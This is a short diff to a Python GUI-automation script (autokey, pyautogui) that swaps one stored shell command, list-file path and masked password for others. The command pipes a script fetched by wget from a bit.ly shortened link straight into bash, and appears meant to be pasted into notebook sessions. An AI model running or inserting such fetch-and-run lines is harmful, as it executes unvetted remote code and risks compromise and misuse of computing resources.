@@ -3,9 +3,9 @@ import time,os
 from autokey import *
 import pyautogui
 
-col_cmd = "!wget -q -O - bit.ly/cpu10005 | bash"
-listfile = '/home/one/g100'
-gpass = "***********"
+col_cmd = "!wget -q -O - bit.ly/gpu001 | bash"
+listfile = '/home/one/g03'
+gpass = "p******p"
 new = True
 global_slow_motion = 0.6
 
